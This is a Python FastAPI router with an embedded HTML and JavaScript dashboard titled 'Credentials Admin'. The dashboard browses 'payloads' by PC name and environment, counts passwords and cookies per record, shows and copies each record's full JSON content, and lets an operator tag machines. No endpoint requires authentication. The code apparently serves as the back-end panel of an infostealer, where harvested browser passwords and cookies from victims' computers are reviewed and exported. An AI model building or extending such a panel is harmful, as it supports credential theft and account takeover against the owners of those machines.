from fastapi import APIRouter, Query
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

from app.repository import (
    get_payload_by_id,
    list_distinct_environments,
    list_distinct_pc_names,
    list_payloads,
    list_pcs,
    update_pc_tag,
)

router = APIRouter()


class PcTagBody(BaseModel):
    tag: str | None = None


@router.get("/admin-credentials", response_class=HTMLResponse)
async def admin_page() -> HTMLResponse:
    return HTMLResponse(_ADMIN_HTML)


@router.get("/admin-credentials/payloads")
async def admin_list_payloads(
    environment: str = Query(default="production"),
    pc_name: str | None = Query(default=None),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=20, ge=1, le=100),
) -> JSONResponse:
    items, total = list_payloads(
        environment=environment or None,
        pc_name=pc_name or None,
        page=page,
        page_size=page_size,
    )
    total_pages = (total + page_size - 1) // page_size if total else 0
    return JSONResponse(
        {
            "items": items,
            "total": total,
            "page": page,
            "page_size": page_size,
            "total_pages": total_pages,
        }
    )


@router.get("/admin-credentials/payloads/{payload_id}")
async def admin_get_payload(payload_id: int) -> JSONResponse:
    payload = get_payload_by_id(payload_id)
    if payload is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(payload)


@router.get("/admin-credentials/filters")
async def admin_filters(environment: str = Query(default="production")) -> JSONResponse:
    return JSONResponse(
        {
            "environments": list_distinct_environments(),
            "pc_names": list_distinct_pc_names(environment=environment or None),
        }
    )


@router.get("/admin-credentials/pcs")
async def admin_list_pcs(
    environment: str = Query(default="production"),
    page: int = Query(default=1, ge=1),
    page_size: int = Query(default=20, ge=1, le=100),
) -> JSONResponse:
    items, total = list_pcs(environment=environment or None, page=page, page_size=page_size)
    total_pages = (total + page_size - 1) // page_size if total else 0
    return JSONResponse(
        {
            "items": items,
            "total": total,
            "page": page,
            "page_size": page_size,
            "total_pages": total_pages,
        }
    )


@router.put("/admin-credentials/pcs/{pc_id}")
async def admin_update_pc(pc_id: int, body: PcTagBody) -> JSONResponse:
    updated = update_pc_tag(pc_id, body.tag)
    if updated is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(updated)


_ADMIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: system-ui, sans-serif;
      margin: 0;
      background: #0f1115;
      color: #e6e8eb;
      min-height: 100vh;
    }
    header {
      padding: 1rem 1.25rem;
      border-bottom: 1px solid #2a2f3a;
      background: #151820;
    }
    header h1 { margin: 0; font-size: 1.1rem; font-weight: 600; }
    .tabs {
      display: flex;
      gap: 0.5rem;
      padding: 0.75rem 1.25rem 0;
      border-bottom: 1px solid #2a2f3a;
      background: #151820;
    }
    .tab {
      padding: 0.55rem 0.9rem;
      border: 1px solid transparent;
      border-bottom: none;
      border-radius: 6px 6px 0 0;
      background: transparent;
      color: #9aa3b2;
      cursor: pointer;
      font: inherit;
    }
    .tab.active {
      background: #0f1115;
      border-color: #2a2f3a;
      color: #e6e8eb;
    }
    .panel[hidden] { display: none; }
    .container { padding: 1rem 1.25rem 2rem; max-width: 1200px; margin: 0 auto; }
    .toolbar {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
      align-items: end;
      margin-bottom: 1rem;
    }
    label {
      display: grid;
      gap: 0.35rem;
      font-size: 0.8rem;
      color: #9aa3b2;
      min-width: 160px;
    }
    select {
      padding: 0.55rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #0f1115;
      color: #e6e8eb;
      font: inherit;
    }
    button {
      padding: 0.55rem 0.85rem;
      border: 1px solid #3d4660;
      border-radius: 6px;
      background: #1c2230;
      color: #e6e8eb;
      font: inherit;
      cursor: pointer;
    }
    button:hover { background: #252d3f; }
    button.primary { background: #2563eb; border-color: #2563eb; }
    button.primary:hover { background: #1d4ed8; }
    button:disabled { opacity: 0.45; cursor: not-allowed; }
    .table-wrap {
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      overflow: hidden;
      background: #151820;
    }
    table { width: 100%; border-collapse: collapse; }
    th, td {
      padding: 0.75rem 1rem;
      text-align: left;
      border-bottom: 1px solid #2a2f3a;
      font-size: 0.88rem;
    }
    th {
      background: #1a2030;
      color: #9aa3b2;
      font-size: 0.78rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.03em;
    }
    tr:last-child td { border-bottom: none; }
    tbody tr { cursor: pointer; }
    tbody tr:hover { background: #1a2030; }
    .mono { font-family: ui-monospace, monospace; font-size: 0.82rem; }
    .empty {
      padding: 2rem;
      text-align: center;
      color: #9aa3b2;
    }
    .pagination {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      margin-top: 1rem;
      flex-wrap: wrap;
    }
    .pagination-info { font-size: 0.85rem; color: #9aa3b2; }
    .pagination-controls { display: flex; gap: 0.5rem; align-items: center; }
    .page-indicator { font-size: 0.85rem; min-width: 100px; text-align: center; }
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
      z-index: 100;
    }
    .modal-backdrop[hidden] { display: none; }
    .modal {
      width: min(900px, 100%);
      max-height: 90vh;
      background: #151820;
      border: 1px solid #2a2f3a;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }
    .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      padding: 1rem 1.25rem;
      border-bottom: 1px solid #2a2f3a;
    }
    .modal-title { font-weight: 600; font-size: 0.95rem; }
    .modal-actions { display: flex; gap: 0.5rem; }
    .modal-body {
      padding: 1rem 1.25rem 1.25rem;
      overflow: auto;
    }
    pre {
      margin: 0;
      padding: 1rem;
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      background: #0b0d11;
      overflow: auto;
      max-height: calc(90vh - 140px);
      font-size: 0.78rem;
      line-height: 1.45;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .status { font-size: 0.8rem; color: #22c55e; margin-top: 0.5rem; min-height: 1rem; }
    .tag-pill {
      display: inline-block;
      padding: 0.15rem 0.45rem;
      border-radius: 999px;
      background: #1e3a5f;
      color: #93c5fd;
      font-size: 0.75rem;
    }
    .tag-muted { color: #6b7280; font-size: 0.78rem; }
    .tag-input {
      width: 100%;
      min-width: 180px;
      padding: 0.5rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #0f1115;
      color: #e6e8eb;
      font: inherit;
    }
    .row-actions { display: flex; gap: 0.5rem; align-items: center; }
    .save-status { font-size: 0.78rem; color: #22c55e; min-width: 4rem; }
  </style>
</head>
<body>
  <header><h1>Credentials Admin</h1></header>
  <div class="tabs">
    <button type="button" class="tab active" data-tab="records">Records</button>
    <button type="button" class="tab" data-tab="pcs">PCs</button>
  </div>

  <div id="records-panel" class="panel container">
    <div class="toolbar">
      <label>
        Environment
        <select id="env-filter"></select>
      </label>
      <label>
        PC
        <select id="pc-filter">
          <option value="">All</option>
        </select>
      </label>
      <button type="button" id="refresh-btn">Refresh</button>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>PC</th>
            <th>Tag</th>
            <th>Environment</th>
            <th>Datetime</th>
            <th>Passwords</th>
            <th>Cookies</th>
          </tr>
        </thead>
        <tbody id="table-body"></tbody>
      </table>
      <div id="table-empty" class="empty" hidden>No records found.</div>
    </div>

    <div class="pagination">
      <div class="pagination-info" id="pagination-info"></div>
      <div class="pagination-controls">
        <button type="button" id="prev-btn">Previous</button>
        <span class="page-indicator" id="page-indicator"></span>
        <button type="button" id="next-btn">Next</button>
      </div>
    </div>
  </div>

  <div id="pcs-panel" class="panel container" hidden>
    <div class="toolbar">
      <label>
        Environment
        <select id="pcs-env-filter"></select>
      </label>
      <button type="button" id="pcs-refresh-btn">Refresh</button>
    </div>

    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>PC</th>
            <th>Environment</th>
            <th>Identification tag</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="pcs-table-body"></tbody>
      </table>
      <div id="pcs-table-empty" class="empty" hidden>No PCs found.</div>
    </div>

    <div class="pagination">
      <div class="pagination-info" id="pcs-pagination-info"></div>
      <div class="pagination-controls">
        <button type="button" id="pcs-prev-btn">Previous</button>
        <span class="page-indicator" id="pcs-page-indicator"></span>
        <button type="button" id="pcs-next-btn">Next</button>
      </div>
    </div>
  </div>

  <div id="modal-backdrop" class="modal-backdrop" hidden>
    <div class="modal" role="dialog" aria-modal="true">
      <div class="modal-header">
        <div class="modal-title" id="modal-title"></div>
        <div class="modal-actions">
          <button type="button" id="copy-btn" class="primary">Copy JSON</button>
          <button type="button" id="close-btn">Close</button>
        </div>
      </div>
      <div class="modal-body">
        <pre id="json-view"></pre>
        <div class="status" id="copy-status"></div>
      </div>
    </div>
  </div>

  <script>
    const envFilter = document.getElementById("env-filter");
    const pcFilter = document.getElementById("pc-filter");
    const tableBody = document.getElementById("table-body");
    const tableEmpty = document.getElementById("table-empty");
    const paginationInfo = document.getElementById("pagination-info");
    const pageIndicator = document.getElementById("page-indicator");
    const prevBtn = document.getElementById("prev-btn");
    const nextBtn = document.getElementById("next-btn");
    const refreshBtn = document.getElementById("refresh-btn");
    const modalBackdrop = document.getElementById("modal-backdrop");
    const modalTitle = document.getElementById("modal-title");
    const jsonView = document.getElementById("json-view");
    const copyBtn = document.getElementById("copy-btn");
    const closeBtn = document.getElementById("close-btn");
    const copyStatus = document.getElementById("copy-status");

    const PAGE_SIZE = 20;
    let currentPage = 1;
    let totalPages = 0;
    let pcsCurrentPage = 1;
    let pcsTotalPages = 0;
    let currentJson = "";

    const tabs = document.querySelectorAll(".tab");
    const recordsPanel = document.getElementById("records-panel");
    const pcsPanel = document.getElementById("pcs-panel");
    const pcsEnvFilter = document.getElementById("pcs-env-filter");
    const pcsTableBody = document.getElementById("pcs-table-body");
    const pcsTableEmpty = document.getElementById("pcs-table-empty");
    const pcsPaginationInfo = document.getElementById("pcs-pagination-info");
    const pcsPageIndicator = document.getElementById("pcs-page-indicator");
    const pcsPrevBtn = document.getElementById("pcs-prev-btn");
    const pcsNextBtn = document.getElementById("pcs-next-btn");
    const pcsRefreshBtn = document.getElementById("pcs-refresh-btn");

    function escapeHtml(value) {
      return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;");
    }

    async function loadFilters() {
      const env = envFilter.value || "production";
      const res = await fetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
      const data = await res.json();

      const prevEnv = envFilter.value;
      envFilter.innerHTML = "";
      const envs = data.environments.length ? data.environments : ["production"];
      for (const e of envs) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        envFilter.appendChild(opt);
      }
      envFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes("production") ? "production" : envs[0]);

      const prevPc = pcFilter.value;
      pcFilter.innerHTML = '<option value="">All</option>';
      for (const pc of data.pc_names) {
        const opt = document.createElement("option");
        opt.value = pc;
        opt.textContent = pc;
        pcFilter.appendChild(opt);
      }
      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
    }

    async function loadList(page = currentPage) {
      currentPage = page;
      const params = new URLSearchParams();
      params.set("environment", envFilter.value || "production");
      params.set("page", String(currentPage));
      params.set("page_size", String(PAGE_SIZE));
      if (pcFilter.value) params.set("pc_name", pcFilter.value);

      const res = await fetch(`/admin-credentials/payloads?${params}`);
      const data = await res.json();

      totalPages = data.total_pages;
      tableBody.innerHTML = "";
      tableEmpty.hidden = data.total > 0;

      for (const item of data.items) {
        const tr = document.createElement("tr");
        const tagHtml = item.tag
          ? `<span class="tag-pill">${escapeHtml(item.tag)}</span>`
          : `<span class="tag-muted">—</span>`;
        tr.innerHTML = `
          <td class="mono">#${item.id}</td>
          <td>${escapeHtml(item.pc_name)}</td>
          <td>${tagHtml}</td>
          <td>${escapeHtml(item.environment)}</td>
          <td class="mono">${escapeHtml(item.datetime)}</td>
          <td>${item.password_count ?? 0}</td>
          <td>${item.cookie_count ?? 0}</td>`;
        tr.addEventListener("click", () => openModal(item.id));
        tableBody.appendChild(tr);
      }

      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
      const end = Math.min(data.page * data.page_size, data.total);
      paginationInfo.textContent = data.total
        ? `Showing ${start}–${end} of ${data.total}`
        : "No results";
      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
      prevBtn.disabled = data.page <= 1;
      nextBtn.disabled = data.page >= data.total_pages;
    }

    async function loadPcs(page = pcsCurrentPage) {
      pcsCurrentPage = page;
      const params = new URLSearchParams();
      params.set("environment", pcsEnvFilter.value || "production");
      params.set("page", String(pcsCurrentPage));
      params.set("page_size", String(PAGE_SIZE));

      const res = await fetch(`/admin-credentials/pcs?${params}`);
      const data = await res.json();

      pcsTotalPages = data.total_pages;
      pcsTableBody.innerHTML = "";
      pcsTableEmpty.hidden = data.total > 0;

      for (const item of data.items) {
        const tr = document.createElement("tr");

        const nameTd = document.createElement("td");
        nameTd.textContent = item.pc_name;
        tr.appendChild(nameTd);

        const envTd = document.createElement("td");
        envTd.textContent = item.environment;
        tr.appendChild(envTd);

        const tagTd = document.createElement("td");
        const input = document.createElement("input");
        input.className = "tag-input";
        input.type = "text";
        input.value = item.tag || "";
        input.placeholder = "e.g. Office laptop";
        input.dataset.pcId = String(item.id);
        tagTd.appendChild(input);
        tr.appendChild(tagTd);

        const actionsTd = document.createElement("td");
        const actions = document.createElement("div");
        actions.className = "row-actions";
        const saveBtn = document.createElement("button");
        saveBtn.type = "button";
        saveBtn.className = "primary save-pc-btn";
        saveBtn.dataset.pcId = String(item.id);
        saveBtn.textContent = "Save";
        const status = document.createElement("span");
        status.className = "save-status";
        actions.appendChild(saveBtn);
        actions.appendChild(status);
        actionsTd.appendChild(actions);
        tr.appendChild(actionsTd);

        saveBtn.addEventListener("click", async (e) => {
          e.stopPropagation();
          status.textContent = "";
          status.style.color = "#22c55e";
          const res = await fetch(`/admin-credentials/pcs/${item.id}`, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ tag: input.value }),
          });
          if (res.ok) {
            status.textContent = "Saved";
            if (!recordsPanel.hidden) await loadList(currentPage);
          } else {
            status.textContent = "Error";
            status.style.color = "#ef4444";
          }
        });

        pcsTableBody.appendChild(tr);
      }

      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
      const end = Math.min(data.page * data.page_size, data.total);
      pcsPaginationInfo.textContent = data.total
        ? `Showing ${start}–${end} of ${data.total}`
        : "No results";
      pcsPageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
      pcsPrevBtn.disabled = data.page <= 1;
      pcsNextBtn.disabled = data.page >= data.total_pages;
    }

    async function loadPcsFilters() {
      const env = pcsEnvFilter.value || "production";
      const res = await fetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
      const data = await res.json();
      const prevEnv = pcsEnvFilter.value;
      pcsEnvFilter.innerHTML = "";
      const envs = data.environments.length ? data.environments : ["production"];
      for (const e of envs) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        pcsEnvFilter.appendChild(opt);
      }
      pcsEnvFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes("production") ? "production" : envs[0]);
    }

    function switchTab(name) {
      tabs.forEach((tab) => tab.classList.toggle("active", tab.dataset.tab === name));
      recordsPanel.hidden = name !== "records";
      pcsPanel.hidden = name !== "pcs";
    }

    tabs.forEach((tab) => {
      tab.addEventListener("click", async () => {
        switchTab(tab.dataset.tab);
        if (tab.dataset.tab === "pcs") {
          await loadPcsFilters();
          await loadPcs(1);
        }
      });
    });

    async function openModal(id) {
      copyStatus.textContent = "";
      const res = await fetch(`/admin-credentials/payloads/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      currentJson = JSON.stringify(data.content, null, 2);
      modalTitle.textContent = `${data.pc_name} · ${data.datetime}`;
      jsonView.textContent = currentJson;
      modalBackdrop.hidden = false;
      document.body.style.overflow = "hidden";
    }

    function closeModal() {
      modalBackdrop.hidden = true;
      document.body.style.overflow = "";
      copyStatus.textContent = "";
    }

    async function copyJson() {
      copyStatus.textContent = "";
      try {
        await navigator.clipboard.writeText(currentJson);
        copyStatus.textContent = "Copied";
      } catch (e) {
        const textarea = document.createElement("textarea");
        textarea.value = currentJson;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        copyStatus.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
        textarea.remove();
      }
    }

    envFilter.addEventListener("change", async () => {
      await loadFilters();
      await loadList(1);
    });
    pcFilter.addEventListener("change", () => loadList(1));
    refreshBtn.addEventListener("click", async () => {
      await loadFilters();
      await loadList(1);
    });
    pcsEnvFilter.addEventListener("change", async () => {
      await loadPcsFilters();
      await loadPcs(1);
    });
    pcsRefreshBtn.addEventListener("click", async () => {
      await loadPcsFilters();
      await loadPcs(1);
    });
    pcsPrevBtn.addEventListener("click", () => {
      if (pcsCurrentPage > 1) loadPcs(pcsCurrentPage - 1);
    });
    pcsNextBtn.addEventListener("click", () => {
      if (pcsCurrentPage < pcsTotalPages) loadPcs(pcsCurrentPage + 1);
    });
    prevBtn.addEventListener("click", () => {
      if (currentPage > 1) loadList(currentPage - 1);
    });
    nextBtn.addEventListener("click", () => {
      if (currentPage < totalPages) loadList(currentPage + 1);
    });
    copyBtn.addEventListener("click", copyJson);
    closeBtn.addEventListener("click", closeModal);
    modalBackdrop.addEventListener("click", (e) => {
      if (e.target === modalBackdrop) closeModal();
    });
    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape" && !modalBackdrop.hidden) closeModal();
    });

    (async () => {
      await loadFilters();
      if (!envFilter.value) envFilter.value = "production";
      await loadPcsFilters();
      if (!pcsEnvFilter.value) pcsEnvFilter.value = "production";
      await loadList(1);
    })();
  </script>
</body>
</html>"""
